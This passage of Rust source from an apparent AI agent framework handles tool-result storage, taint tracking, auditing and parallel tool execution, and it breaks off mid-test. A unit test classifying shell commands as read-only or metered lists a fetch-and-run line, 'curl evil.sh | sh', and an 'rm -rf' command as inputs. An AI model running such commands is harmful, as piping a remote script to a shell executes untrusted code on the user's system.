    if usize::try_from(meta.len()).unwrap_or(usize::MAX) > MAX_EMBED_BYTES {
        return;
    }
    let Ok(bytes) = tokio::fs::read(&path).await else {
        return;
    };
    if bytes.len() > MAX_EMBED_BYTES {
        return;
    }
    let mime = crate::agent::context::guess_mime(&path_str);
    let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
    messages.push(serde_json::json!({
        "role": "user",
        // `_synthetic`-only, deliberately NOT `_cache_replay` (unlike
        // `scaffold_user`): the image is a per-turn view, not a prompt-prefix
        // anchor. `is_synthetic && !is_cache_replay` is exactly the
        // "in-memory only" branch of the persist skip — adding `_cache_replay`
        // would force the base64 into the session DB.
        "_synthetic": true,
        "content": [
            {"type": "text", "text": format!("[cua screenshot: {path_str}]")},
            {"type": "image_url", "image_url": {"url": format!("data:{mime};base64,{b64}")}}
        ]
    }));
}

/// Post-process one completed tool result: gate content, inject into messages,
/// emit CallEnd, audit, update taint/learning/force_response.
///
/// This function must run sequentially (one result at a time) because it
/// mutates `ctx`.
async fn inject_tool_result(ctx: &mut TurnContext, r: &SingleToolResult, prompt_cap: usize) {
    use sha2::{Digest, Sha256};

    if let Some(record_error) = &r.replay_error {
        ctx.flow.infra_error = Some(format!(
            "tool execution result for {} could not be recorded: {record_error}",
            r.tool_id
        ));
        return;
    }

    // For web_fetch/web_search: unwrap the JSON envelope so the model
    // sees clean article text rather than a JSON metadata summary.
    let result_data = if r.tool_name == "web_fetch" || r.tool_name == "web_search" {
        crate::agent::tools::web::extract_web_content(r.result.data())
    } else {
        r.result.data().to_string()
    };

    let cap = prompt_cap.max(1);
    let data = match store_then_render_tool_result(
        &ctx.core.sessions,
        &ctx.session_id,
        &r.tool_id,
        &r.tool_name,
        &r.arguments,
        &result_data,
        r.result.ok(),
        cap,
    )
    .await
    {
        Ok(rendered) => ctx.content_gate.admit_simple(&rendered).into_text(),
        Err(sr) => {
            abort_turn_on_stash_failure(ctx, &r.tool_id, &r.tool_name, &sr);
            return;
        }
    };

    if ctx.core.provenance_config.enabled {
        ctx.messages.with_draft(|draft| {
            ContextBuilder::add_tool_result_immutable_with_status(
                draft,
                &r.tool_id,
                &r.tool_name,
                &data,
                r.result.ok(),
            )
        });
    } else {
        ctx.messages.with_draft(|draft| {
            ContextBuilder::add_tool_result_with_status(
                draft,
                &r.tool_id,
                &r.tool_name,
                &data,
                r.result.ok(),
            )
        });
    }
    if let Err(error) = ctx.persist_pending_protocol_messages().await {
        ctx.flow.infra_error = Some(format!(
            "model-visible tool result for {} could not be recorded: {error}",
            r.tool_id
        ));
        return;
    }
    let persisted_message_id = ctx
        .messages
        .iter()
        .rev()
        .find(|message| {
            message.get("tool_call_id").and_then(Value::as_str) == Some(r.tool_id.as_str())
        })
        .and_then(|message| message.get("_db_id"))
        .and_then(Value::as_i64);
    let Some(persisted_message_id) = persisted_message_id else {
        ctx.flow.infra_error = Some(format!(
            "model-visible tool result for {} was not durably persisted",
            r.tool_id
        ));
        return;
    };
    if let Err(record_error) = ctx
        .core
        .sessions
        .record_tool_post_execute(
            &ctx.session_id,
            &ctx.request_id,
            ctx.turn_count,
            &r.tool_id,
            &data,
            persisted_message_id,
        )
        .await
    {
        ctx.flow.infra_error = Some(format!(
            "tool post-execution result for {} could not be recorded: {record_error}",
            r.tool_id
        ));
        return;
    }
    let raw_result_digest = {
        let mut hasher = Sha256::new();
        hasher.update(r.result.data().as_bytes());
        format!("{:x}", hasher.finalize())
    };
    ctx.flow.tool_guard.record_result_with_status(
        &r.tool_name,
        &r.arguments,
        data.clone(),
        r.result.ok(),
        &r.tool_id,
        &raw_result_digest,
    );
    let recovery_guidance = if ctx.flow.tool_guard.take_read_evidence_nudge() {
        Some((
            "read-only",
            "[system] Three successful read-only calls returned the same non-empty content. \
             Every call executed; no result was inferred or skipped. State what the repeated \
             evidence establishes and identify the remaining gap before changing the target or \
             query, or give an honest partial answer.",
        ))
    } else if ctx.flow.tool_guard.take_exec_output_nudge() {
        Some((
            "exec-output",
            "[system] Three independently executed calls returned identical non-empty exec \
             output. Every call executed. No command equivalence was inferred and no call was \
             skipped. Identify what new information or action is still needed; continue executing \
             if another action is required. Otherwise return an honest partial result with \
             unresolved gaps.",
        ))
    } else {
        None
    };
    if let Some((kind, guidance)) = recovery_guidance {
        ctx.messages
            .push_draft(crate::agent::markers::scaffold_user(guidance.to_string()));
        if let Err(error) = ctx.persist_pending_protocol_messages().await {
            ctx.flow.infra_error = Some(format!(
                "{kind} recovery guidance could not be recorded after {}: {error}",
                r.tool_id,
            ));
            return;
        }
    }

    // Emit CallEnd.
    if let Some(ref tx) = ctx.tool_event_tx {
        let _ = tx.send(ToolEvent::CallEnd {
            tool_name: r.tool_name.clone(),
            tool_call_id: r.tool_id.clone(),
            result_data: r.result.data().to_string(),
            ok: r.result.ok(),
            duration_ms: r.duration_ms,
        });
    }

    // Audit log.
    if let Some(ref audit) = ctx.audit {
        let args_value = serde_json::to_value(&r.arguments).unwrap_or(json!({}));
        let _ = audit.record(
            &r.tool_name,
            &r.tool_id,
            &args_value,
            r.result.data(),
            r.result.ok(),
            r.duration_ms,
            "inline",
        );
    }

    // Track used tools.
    ctx.used_tools.insert(r.tool_name.clone());

    // Taint tracking.
    let taint_detail = r
        .arguments
        .get("url")
        .or_else(|| r.arguments.get("query"))
        .and_then(|v| v.as_str())
        .map(|s| s.chars().take(200).collect::<String>());
    ctx.taint_state.mark_tainted(&r.tool_name, taint_detail);

    // Turn audit summary.
    ctx.turn_tool_entries
        .push(crate::agent::audit::TurnToolEntry {
            name: r.tool_name.clone(),
            id: r.tool_id.clone(),
            ok: r.result.ok(),
            duration_ms: r.duration_ms,
            result_chars: r.result.data().len(),
        });

    // Cua screenshot vision: append the image as a user turn (in-memory only).
    // The image is NOT persisted — this runs after the tool result's own
    // persistence and nothing re-persists it.
    if let Some(path) = cua_screenshot_candidate(
        &r.tool_name,
        r.result.ok(),
        ctx.core.model_capabilities.vision,
        r.result.data(),
        &ctx.core.workspace,
    ) {
        let mut appended = Vec::new();
        append_cua_screenshot_turn(&mut appended, path).await;
        ctx.messages.extend_draft(appended);
    }
}

/// Execute tool calls via the inline (direct) path.
///
/// Adjacent implementation-declared `ParallelSafe` tools execute concurrently
/// with bounded fan-out. Sequential tools are ordering barriers. Results are
/// always post-processed in provider order so `ctx` mutations stay safe and
/// assistant/tool message pairing remains deterministic.
pub(crate) async fn execute_tools_inline(
    ctx: &mut TurnContext,
    routed_tool_calls: &[ToolCallRequest],
    _response: &LLMResponse,
) {
    let allowed: Vec<&ToolCallRequest> = routed_tool_calls.iter().collect();

    // Build taint warnings up-front (immutable borrow of ctx.taint_state).
    let taints: Vec<Option<String>> = allowed
        .iter()
        .map(|tc| {
            if ctx.taint_state.check_sensitive(&tc.name).is_some() {
                Some(ctx.taint_state.taint_summary())
            } else {
                None
            }
        })
        .collect();

    let replay_recorder = ToolReplayRecorder {
        sessions: Arc::clone(&ctx.core.sessions),
        session_id: ctx.session_id.clone(),
        turn_request_id: ctx.request_id.clone(),
        turn_tag: ctx.turn_count,
    };
    let result_cap = inline_hot_prompt_result_cap_for_ctx_batch(ctx, allowed.len());
    let mut start = 0;
    while start < allowed.len() {
        let end = tool_call_chunk_end(&allowed, start, &ctx.tools);
        // Record only the next execution chunk as Ready. If an earlier
        // chunk's raw/model-visible/post result cannot be persisted, later
        // sequential calls and later parallel chunks remain untouched.
        for tc in &allowed[start..end] {
            if let Err(record_error) = ctx
                .core
                .sessions
                .record_tool_pre_execute(
                    &ctx.session_id,
                    &ctx.request_id,
                    ctx.turn_count,
                    &tc.id,
                    &tc.name,
                    &tc.arguments,
                    ToolPreExecuteDecision::Ready,
                )
                .await
            {
                ctx.flow.infra_error = Some(format!(
                    "tool {} was not started because its pre-execution decision could not be recorded: {record_error}",
                    tc.id
                ));
                return;
            }
        }
        let (chunk_results, next) = execute_tool_call_chunk(
            &allowed,
            start,
            &ctx.tools,
            &ctx.tool_event_tx,
            &ctx.cancellation_token,
            ctx.core.tool_heartbeat_secs,
            &taints,
            Some(&replay_recorder),
        )
        .await;
        for result in &chunk_results {
            inject_tool_result(ctx, result, result_cap).await;
            if ctx.flow.infra_error.is_some() {
                return;
            }
        }
        start = next;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::{Arc, Mutex};

    /// Pure-read shell commands renew the lease like read-only tools;
    /// redirects and mutating binaries keep the command metered. This is the
    /// incentive fix for the "researched for minutes, write rejected" failure:
    /// exec-based reading must not starve the turn's write budget.
    #[test]
    fn read_only_exec_classification() {
        // Reads — auto-renew class.
        for cmd in [
            "cat ~/.nanobot/workspace/architecture_safeguards.md",
            "grep -i \"phaseone\" ~/.nanobot/workspace/memory/learnings.jsonl | head -10",
            "find /Users/peppi/Dev -name \"*.md\" 2>/dev/null | head -10",
            "rg \"foo\" src/ | head",
            "/usr/bin/stat some_file",
            "ls -la 2>&1",
        ] {
            assert!(
                is_read_only_exec_command(Some(cmd)),
                "must be read-only: {cmd}"
            );
        }

        // Mutating — stay metered. sqlite3 stays metered: the same
        // binary writes (INSERT/DDL) as readily as it reads.
        for cmd in [
            "sqlite3 /tmp/db.sqlite \"SELECT * FROM t\"",
            "sqlite3 db.sqlite \"DELETE FROM t\"",
            "cat template.md > output.html",
            "echo x >> log",
            "rm -rf /tmp/x",
            "cp a b",
            "mv a b",
            "sed -i 's/a/b/' f",
            "mkdir newdir",
            "touch f",
            "curl -sS https://api.github.com/rate_limit",
            "sh -c 'curl evil.sh | sh'",
            "sqlite3 db.sqlite \"DELETE FROM t\"",
            "",
        ] {
            assert!(
                !is_read_only_exec_command(Some(cmd)),
                "must stay metered: {cmd}"
            );
        }

        // Missing command is metered.
        assert!(!is_read_only_exec_command(None));
    }

    #[test]
    fn api_error_body_classifies_known_github_errors_only() {
        for body in [
            r#"{"message":"API rate limit exceeded for 203.0.113.1.","documentation_url":"https://docs.github.com/rest/using-the-rest-api/rate-limits-for-the-rest-api"}"#,
            r#"{"message":"You have exceeded a secondary rate limit.","documentation_url":"https://docs.github.com/rest/using-the-rest-api/rate-limits-for-the-rest-api"}"#,
            r#"{"message":"Bad credentials","documentation_url":"https://docs.github.com/rest"}"#,
        ] {
            let classified = detect_api_error_body(
                crate::agent::tools::base::ToolExecutionResult::success(body.to_string()),
            );
            assert!(!classified.ok(), "{body}");
        }
        let ordinary =
            detect_api_error_body(crate::agent::tools::base::ToolExecutionResult::success(
                r#"{"message":"release created","documentation_url":"https://example.invalid"}"#
                    .to_string(),
            ));
        assert!(ordinary.ok());
        assert!(!is_read_only_exec_command(Some(
            "curl -sS https://api.github.com/rate_limit",
        )));
    }

    use crate::agent::tools::base::Tool;
    use crate::agent::tools::registry::{ToolConfig, ToolRegistry};

    struct ProbeState {
        started: AtomicUsize,
        active: AtomicUsize,
        peak: AtomicUsize,
        log: Mutex<Vec<String>>,
        changed: tokio::sync::Notify,
    }

    impl ProbeState {
        fn new() -> Arc<Self> {
            Arc::new(Self {
                started: AtomicUsize::new(0),
                active: AtomicUsize::new(0),
                peak: AtomicUsize::new(0),
                log: Mutex::new(Vec::new()),
                changed: tokio::sync::Notify::new(),
            })
        }

        async fn wait_for_started(&self, expected: usize) {
            while self.started.load(Ordering::SeqCst) < expected {
                self.changed.notified().await;
            }
        }
    }

    struct ProbeTool {
        name: String,
        concurrency: ToolConcurrency,
        state: Arc<ProbeState>,
        gate: Option<tokio_util::sync::CancellationToken>,
        fail: bool,
    }

    #[async_trait::async_trait]
    impl Tool for ProbeTool {
        fn name(&self) -> &str {
            &self.name
        }

        fn description(&self) -> &str {
            "test probe"
        }

        fn parameters(&self) -> Value {
            json!({"type": "object", "properties": {}})
        }

        fn concurrency(&self) -> ToolConcurrency {
            self.concurrency
        }

        async fn execute(
            &self,
            _params: HashMap<String, Value>,
            _ctx: &crate::agent::tools::base::ToolContext,
        ) -> crate::agent::tools::base::ToolResult {
            self.state.started.fetch_add(1, Ordering::SeqCst);
            let active = self.state.active.fetch_add(1, Ordering::SeqCst) + 1;
            self.state.peak.fetch_max(active, Ordering::SeqCst);
            self.state.log.lock().unwrap().push(self.name.clone());
            self.state.changed.notify_waiters();
            if let Some(gate) = &self.gate {
                gate.cancelled().await;
            }
            self.state.active.fetch_sub(1, Ordering::SeqCst);
            if self.fail {
                Err(crate::errors::ToolError::Execution {
                    message: "probe failure".to_string(),
                })
            } else {
                Ok(format!("{} complete", self.name).into())
            }
        }
    }

    fn register_probe(
        registry: &mut ToolRegistry,
        name: &str,
        concurrency: ToolConcurrency,
        state: &Arc<ProbeState>,
        gate: Option<tokio_util::sync::CancellationToken>,
        fail: bool,
    ) {
        registry.register(Box::new(ProbeTool {
            name: name.to_string(),
            concurrency,
            state: Arc::clone(state),
            gate,
            fail,
        }));
    }

    async fn run_probe_calls(
        registry: &ToolRegistry,
        calls: &[ToolCallRequest],
        cancellation: Option<tokio_util::sync::CancellationToken>,
    ) -> Vec<SingleToolResult> {
        let refs: Vec<&ToolCallRequest> = calls.iter().collect();
        execute_tool_calls_ordered(
            &refs,
            registry,
            &None,
            &cancellation,
            60,
            vec![None; calls.len()],
            None,
        )
        .await
    }

    fn make_tc(name: &str, id: &str) -> ToolCallRequest {
        ToolCallRequest {
            id: id.to_string(),
            name: name.to_string(),
            arguments: HashMap::new(),
        }
    }

    #[test]
    fn tool_result_preview_never_exceeds_cap_with_long_call_id() {
        let call_id = "provider-controlled-id-".repeat(500);
        let preview = build_tool_result_preview(
            "read_file",
            &HashMap::new(),
            &"body".repeat(2_000),
            64,
            &call_id,
        );

        assert!(
            preview.chars().count() <= 64,
            "non-handle preview exceeded its append allowance: {} chars",
            preview.chars().count()
        );
    }

    #[test]
    fn test_summary_threshold_enumerative_tools_high() {
        // Enumerative tools return specific strings (filenames, URLs, error
        // lines) that the model must quote verbatim. They should tolerate
        // much larger raw output before a summary replaces them.
        assert_eq!(summary_threshold_tokens("exec"), 4000);
        assert_eq!(summary_threshold_tokens("list_dir"), 4000);
        assert_eq!(summary_threshold_tokens("web_search"), 4000);
        assert_eq!(summary_threshold_tokens("read_file"), 4000);
        assert_eq!(summary_threshold_tokens("search_files"), 4000);
    }

    #[test]
    fn test_summary_threshold_other_tools_default() {
        // Non-enumerative tools keep the stricter default threshold.
        assert_eq!(
            summary_threshold_tokens("write_file"),
            LARGE_TOOL_RESULT_TOKEN_THRESHOLD
        );
        assert_eq!(
            summary_threshold_tokens("edit_file"),
            LARGE_TOOL_RESULT_TOKEN_THRESHOLD
        );
        assert_eq!(
            summary_threshold_tokens("spawn"),
            LARGE_TOOL_RESULT_TOKEN_THRESHOLD
        );
        assert_eq!(
            summary_threshold_tokens("unknown_tool"),
            LARGE_TOOL_RESULT_TOKEN_THRESHOLD
        );
    }

    #[test]
    fn digest_tool_result_passes_small_data_raw() {
        let args = HashMap::new();
        let out = digest_tool_result("exec", &args, "short output", 1200, "call_1");
        assert_eq!(out, "short output");
    }

    #[test]
    fn configured_tool_result_cap_is_the_hot_prompt_cap() {
        assert_eq!(effective_tool_result_cap(10_000), 10_000);
        assert_eq!(effective_tool_result_cap(2_000), 2_000);
    }

    #[tokio::test]
    async fn failed_tool_result_stash_surfaces_err_failed_never_raw() {
        // Under the "handles-not-bodies" invariant (plan Hole 1), a stash
        // failure MUST NOT fall back to showing the raw body — that would put
        // un-stashed bytes in the prompt and a recall pointer at nothing. The
        // caller aborts the turn. This replaces the prior fall-back-to-raw
        // contract and its regression test.
        let temp = tempfile::tempdir().unwrap();
        let sessions = crate::session::SessionDb::new(&temp.path().join("sessions.db"));
        let data = format!(
            "{}MIDDLE_SECRET{}",
            "head\n".repeat(100),
            "tail\n".repeat(100)
        );
        let cap = 120;

        // The missing session makes SQLite reject the foreign-keyed result.
        let outcome = stash_tool_result_for_prompt_shaping(
            &sessions,
            "missing-session",
            "call_failed",
            "read_file",
            &data,
            cap,
            false,
        )
        .await;

        assert!(
            outcome.is_err(),
            "a stash failure must surface as Err so the caller aborts the turn; got {outcome:?}"
        );
        assert_eq!(
            outcome.unwrap_err(),
            crate::session::db::StoredResult::Failed,
            "missing-session insert must report Failed, never Ok(false)-and-show-raw"
        );
    }

    #[tokio::test]
    async fn successful_tool_result_stash_allows_lossless_recall_preview() {
        let temp = tempfile::tempdir().unwrap();
        let sessions = crate::session::SessionDb::new(&temp.path().join("sessions.db"));
        let session = sessions.create_session("test:tool-result").await;
        let data = format!(
            "{}MIDDLE_SECRET{}",
            "head\n".repeat(100),
            "tail\n".repeat(100)
        );
        let cap = 120;

        let stashed = stash_tool_result_for_prompt_shaping(
            &sessions,
            &session.id,
            "call_stored",
            "read_file",
            &data,
            cap,
            false,
        )
        .await
        .expect("fresh-key stash of oversized data must succeed");
        let injected = digest_tool_result("read_file", &HashMap::new(), &data, cap, "call_stored");

        assert!(stashed);
        assert!(injected.contains("inspect_tool_result"));
        assert!(!injected.contains("MIDDLE_SECRET"));
        assert_eq!(
            sessions
                .load_tool_result(&session.id, "call_stored")
                .await
                .as_deref(),
            Some(data.as_str())
        );
    }

    #[tokio::test]
    async fn replay_byte_cap_stashes_multibyte_below_char_cap() {
        let temp = tempfile::tempdir().unwrap();
        let sessions = crate::session::SessionDb::new(&temp.path().join("sessions.db"));
        let session = sessions.create_session("test:replay-byte-cap").await;
        // Multibyte UTF-8: below the configured char cap but over the byte cap,
        // so the byte cap (the replay ceiling) is what forces the stash.
        let data = format!("{}MIDDLE_SECRET{}", "あ".repeat(3000), "い".repeat(3000));
        assert!(data.len() > TOOL_RESULT_REPLAY_MAX_BYTES);
        assert!(data.chars().count() < 10_000);

        let stashed = stash_tool_result_for_prompt_shaping(
            &sessions,
            &session.id,
            "call_replay_cap",
            "read_file",
            &data,
            10_000,
            false,
        )
        .await
        .expect("fresh-key stash must succeed");
        let injected = digest_tool_result(
            "read_file",
            &HashMap::new(),
            &data,
            10_000,
            "call_replay_cap",
        );

        assert!(stashed);
        // A sub-char-cap body is CONTENT, not a handle: the digest shows it
        // (fit-case passthrough), and replay truncation is bounded by the byte
        // cap. The old 8-10KB band regressed to unresolvable handles (session
        // 20260804_204406_c16eb0); the cap raise closed it.
        assert!(injected.contains("MIDDLE_SECRET"));
        let replay_body = crate::agent::context_hygiene::cap_tool_result_for_replay(&injected);
        assert!(
            replay_body.len() <= TOOL_RESULT_REPLAY_MAX_BYTES + 40,
            "final prompt body must be replay-cap stable"
        );
        assert_eq!(
            sessions
                .load_tool_result(&session.id, "call_replay_cap")
                .await
                .as_deref(),
            Some(data.as_str())
        );
    }

    #[tokio::test]
    async fn byte_cap_band_below_char_cap_stays_inline() {
        let temp = tempfile::tempdir().unwrap();
        let sessions = crate::session::SessionDb::new(&temp.path().join("sessions.db"));
        let session = sessions.create_session("test:inline-band").await;
        // The old dead band: ASCII body under the configured char cap but over
        // the old 8KB byte cap degraded to a handle. It must now stay inline.
        let data = format!(
            "{}MIDDLE_SECRET{}",
            "head\n".repeat(1200),
            "tail\n".repeat(600)
        );
        assert!(data.chars().count() <= 10_000);
        assert!(data.len() <= TOOL_RESULT_REPLAY_MAX_BYTES);

        let stashed = stash_tool_result_for_prompt_shaping(
            &sessions,
            &session.id,
            "call_inline",
            "read_file",
            &data,
            10_000,
            false,
        )
        .await
        .expect("sub-cap body needs no stash");
        let injected =
            digest_tool_result("read_file", &HashMap::new(), &data, 10_000, "call_inline");

        assert!(
            !stashed,
            "sub-cap ASCII body must stay inline, not stashed as a handle"
        );
        assert!(
            injected.contains("MIDDLE_SECRET"),
            "inline body must be fully visible, not truncated: {injected}"
        );
        assert!(
            sessions
                .load_tool_result(&session.id, "call_inline")
                .await
                .is_none(),
            "nothing stashed, nothing to recall"
        );
    }

    #[test]
    fn digest_tool_result_points_to_sqlite_recall() {
        let mut args = HashMap::new();
        args.insert("path".to_string(), serde_json::json!("src/lib.rs"));
        let data = format!(
            "{}MIDDLE_SECRET{}",
            "head line\n".repeat(200),
            "tail line\n".repeat(200)
        );

        let out = digest_tool_result("read_file", &args, &data, 1200, "call_42");

        // Preview is bounded and omits the middle.
        assert!(out.chars().count() <= 1200);
        assert!(!out.contains("MIDDLE_SECRET"));
        // Points the model at the bounded inspection tool with the right id.
        assert!(out.contains("inspect_tool_result"));
        assert!(out.contains("call_42"));
    }

    /// An inspected result that exceeds the replay cap must NOT enter live
    /// context raw. The digest must bound it and point to the one bounded
    /// inspection operation against its own id.
    #[test]
    fn digest_tool_result_caps_inspected_body_and_points_to_inspect() {
        let args = HashMap::new();
        // ~200KB body, far over the replay cap.
        let data = format!(
            "{}NEVER_INLINE_THIS_SECRET{}",
            "head line\n".repeat(10_000),
            "tail line\n".repeat(10_000)
        );
        let cap = TOOL_RESULT_REPLAY_MAX_BYTES;

        let out = digest_tool_result("inspect_tool_result", &args, &data, cap, "inspect_call_7");

        // (a) bounded — never the raw 200KB.
        assert!(
            out.chars().count() <= cap + 40,
            "inspected body must be capped to ~replay budget, got {} chars",
            out.chars().count()
        );
        assert!(
            !out.contains("NEVER_INLINE_THIS_SECRET"),
            "the oversized middle must not enter the preview"
        );
        assert!(out.contains("inspect_tool_result"));
        assert!(out.contains("inspect_call_7"));
    }

    #[test]
    fn batch_tool_result_cap_is_shared_across_parallel_reads() {
        let mut args = HashMap::new();
        args.insert("path".to_string(), serde_json::json!("src/lib.rs"));
        let data = format!(
            "{}MIDDLE_SECRET{}",
            "head line\n".repeat(450),
            "tail line\n".repeat(450)
        );
        let per_result_cap =
            inline_hot_prompt_result_cap_from_effective(effective_tool_result_cap(10_000), 3);

        let outputs: Vec<String> = (0..3)
            .map(|idx| {
                digest_tool_result(
                    "read_file",
                    &args,
                    &data,
                    per_result_cap,
                    &format!("call_{idx}"),
                )
            })
            .collect();
        let total_chars: usize = outputs.iter().map(|out| out.chars().count()).sum();

        assert!(
            total_chars <= TOOL_RESULT_REPLAY_MAX_BYTES,
            "batch prompt payload must stay under one replay budget, got {total_chars}"
        );
        for (idx, out) in outputs.iter().enumerate() {
            assert!(out.contains("inspect_tool_result"));
            assert!(out.contains(&format!("call_{idx}")));
            assert!(!out.contains("MIDDLE_SECRET"));
        }
    }

    #[test]
    fn test_tool_concurrency_is_declared_by_implementation() {
        let registry =
            ToolRegistry::with_standard_tools(&ToolConfig::new(std::path::Path::new(".")));
        for name in [
            "read_file",
            "file_preview",
            "list_dir",
            "file_info",
            "web_fetch",
            "web_search",
            "get_skills",
        ] {
            assert_eq!(registry.concurrency(name), ToolConcurrency::ParallelSafe);
        }
        for name in ["exec", "write_file", "find_files", "unknown_tool"] {
            assert_eq!(registry.concurrency(name), ToolConcurrency::Sequential);
        }
    }

    #[tokio::test]
    async fn inline_write_redelivery_is_idempotent_without_event_subscriber() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("artifact.txt");
        let mut registry = ToolRegistry::new();
        registry.register(Box::new(crate::agent::tools::WriteFileTool::default()));

        let staged = ToolCallRequest {
            id: "call_piece_1".to_string(),
            name: "write_file".to_string(),
            arguments: HashMap::from([
                ("path".to_string(), json!(path)),
                ("content".to_string(), json!("once-")),
                ("state".to_string(), json!("more")),
            ]),
        };
        for _ in 0..2 {
            let result =
                execute_single_tool(&staged, &registry, &None, &None, 60, None, None).await;
            assert!(result.result.ok(), "{:?}", result.result.error());
        }

        let final_piece = ToolCallRequest {
            id: "call_piece_2".to_string(),
            name: "write_file".to_string(),
            arguments: HashMap::from([
                ("path".to_string(), json!(path)),
                ("content".to_string(), json!("done")),
                ("state".to_string(), json!("complete")),
            ]),
        };
        let result =
            execute_single_tool(&final_piece, &registry, &None, &None, 60, None, None).await;
        assert!(result.result.ok(), "{:?}", result.result.error());
        assert_eq!(std::fs::read_to_string(path).unwrap(), "once-done");
    }

    #[tokio::test]
    async fn parallel_safe_calls_overlap_and_preserve_order() {
        let state = ProbeState::new();
        let gate = tokio_util::sync::CancellationToken::new();
        let mut registry = ToolRegistry::new();
        register_probe(
            &mut registry,
            "safe_a",
            ToolConcurrency::ParallelSafe,
            &state,
            Some(gate.clone()),
            false,
        );
        register_probe(
            &mut registry,
            "safe_b",
            ToolConcurrency::ParallelSafe,
            &state,
            Some(gate.clone()),
            false,
        );
        let calls = vec![make_tc("safe_a", "a"), make_tc("safe_b", "b")];
        let execution = run_probe_calls(&registry, &calls, None);
        let release = async {
            tokio::time::timeout(Duration::from_secs(1), state.wait_for_started(2))
                .await
                .expect("parallel calls did not overlap");
            assert_eq!(state.peak.load(Ordering::SeqCst), 2);
            gate.cancel();
        };
        let (results, ()) = tokio::join!(execution, release);
        assert_eq!(
            results
                .iter()
                .map(|r| r.tool_id.as_str())
                .collect::<Vec<_>>(),
            vec!["a", "b"]
        );
    }

    #[tokio::test]
    async fn tool_execute_events_follow_actual_parallel_completion_order() {
        // Break caught: raw execution exits are journaled later during
        // provider-order message injection, obscuring which parallel tool
        // actually completed first.
        let state = ProbeState::new();
        let slow_gate = tokio_util::sync::CancellationToken::new();
        let fast_gate = tokio_util::sync::CancellationToken::new();
        let mut registry = ToolRegistry::new();
        register_probe(
            &mut registry,
            "slow",
            ToolConcurrency::ParallelSafe,
            &state,
            Some(slow_gate.clone()),
            false,
        );
        register_probe(
            &mut registry,
            "fast",
            ToolConcurrency::ParallelSafe,
            &state,
            Some(fast_gate.clone()),
            false,
        );
        let calls = vec![make_tc("slow", "tc-slow"), make_tc("fast", "tc-fast")];

        let dir = tempfile::tempdir().unwrap();
        let sessions = Arc::new(crate::session::SessionDb::new(
            &dir.path().join("sessions.db"),
        ));
        let session = sessions.create_session("cli:completion-order").await;
        for call in &calls {
            sessions
                .record_tool_pre_execute(
                    &session.id,
                    "turn-tools",
                    1,
                    &call.id,
                    &call.name,
                    &call.arguments,
                    ToolPreExecuteDecision::Ready,
                )
                .await
                .unwrap();
        }
        let recorder = ToolReplayRecorder {
            sessions: Arc::clone(&sessions),
            session_id: session.id.clone(),
            turn_request_id: "turn-tools".to_string(),
            turn_tag: 1,
        };
        let refs = calls.iter().collect::<Vec<_>>();
        let execution = execute_tool_calls_ordered(
            &refs,
            &registry,
            &None,
            &None,
            60,
            vec![None; calls.len()],
            Some(&recorder),
        );
        let release =
            async {
                tokio::time::timeout(Duration::from_secs(1), state.wait_for_started(2))
                    .await
                    .expect("parallel calls did not start");
                fast_gate.cancel();
                loop {
                    let events = sessions.load_session_events(&session.id).await.unwrap();
                    if events.iter().any(|event| matches!(
                    &event.payload,
                    crate::session::db::SessionEventPayload::ToolExecute { tool_call_id, .. }
                        if tool_call_id == "tc-fast"
                )) {
                    break;
                }
                    tokio::task::yield_now().await;
                }
                slow_gate.cancel();
            };
        let (_results, ()) = tokio::join!(execution, release);
        let completion_order = sessions
            .load_session_events(&session.id)
            .await
            .unwrap()
            .into_iter()
            .filter_map(|event| match event.payload {
                crate::session::db::SessionEventPayload::ToolExecute { tool_call_id, .. } => {
                    Some(tool_call_id)
                }
                _ => None,
            })
            .collect::<Vec<_>>();
        assert_eq!(completion_order, vec!["tc-fast", "tc-slow"]);
    }

    #[tokio::test]
    async fn sequential_tool_is_an_ordering_barrier() {
        let state = ProbeState::new();
        let gate = tokio_util::sync::CancellationToken::new();
        let mut registry = ToolRegistry::new();
        for name in ["safe_a", "safe_b"] {
            register_probe(
                &mut registry,
                name,
                ToolConcurrency::ParallelSafe,
                &state,
                Some(gate.clone()),
                false,
            );
        }
        register_probe(
            &mut registry,
            "serial",
            ToolConcurrency::Sequential,
            &state,
            None,
            false,
        );
        register_probe(
            &mut registry,
            "safe_c",
            ToolConcurrency::ParallelSafe,
            &state,
            None,
            false,
        );
        let calls = vec![
            make_tc("safe_a", "a"),
            make_tc("safe_b", "b"),
            make_tc("serial", "s"),
            make_tc("safe_c", "c"),
        ];
        let execution = run_probe_calls(&registry, &calls, None);
        let release = async {
            tokio::time::timeout(Duration::from_secs(1), state.wait_for_started(2))
                .await
                .expect("first safe run did not start");
            let log = state.log.lock().unwrap().clone();
            assert!(!log.iter().any(|name| name == "serial" || name == "safe_c"));
            gate.cancel();
        };
        let (results, ()) = tokio::join!(execution, release);
        assert_eq!(
            results
                .iter()
                .map(|r| r.tool_id.as_str())
                .collect::<Vec<_>>(),
            vec!["a", "b", "s", "c"]
        );
    }

    #[tokio::test]
    async fn parallel_failure_is_all_settled_before_serial_barrier() {
        let state = ProbeState::new();
        let gate = tokio_util::sync::CancellationToken::new();
        let mut registry = ToolRegistry::new();
        register_probe(
            &mut registry,
            "fail",
            ToolConcurrency::ParallelSafe,
            &state,
            None,
            true,
        );
        register_probe(
            &mut registry,
            "keep",
            ToolConcurrency::ParallelSafe,
            &state,
            Some(gate.clone()),
            false,
        );
        register_probe(
            &mut registry,
            "serial",
            ToolConcurrency::Sequential,
            &state,
            None,
            false,
        );
        let calls = vec![
            make_tc("fail", "f"),
            make_tc("keep", "k"),
            make_tc("serial", "s"),
        ];
        let execution = run_probe_calls(&registry, &calls, None);
        let release = async {
            tokio::time::timeout(Duration::from_secs(1), state.wait_for_started(2))
                .await
                .expect("safe siblings did not both start");
            assert!(!state
                .log
                .lock()
                .unwrap()
                .iter()
                .any(|name| name == "serial"));
            gate.cancel();
        };
        let (results, ()) = tokio::join!(execution, release);
        assert!(!results[0].result.ok());
        assert!(results[1].result.ok());
        assert!(results[2].result.ok());
    }

    #[tokio::test]
    async fn parallelism_never_exceeds_cap() {
        let state = ProbeState::new();
        let gate = tokio_util::sync::CancellationToken::new();
        let mut registry = ToolRegistry::new();
        let mut calls = Vec::new();
        for index in 0..MAX_PARALLEL_TOOL_CALLS + 2 {
            let name = format!("safe_{index}");
            register_probe(
                &mut registry,
                &name,
                ToolConcurrency::ParallelSafe,
                &state,
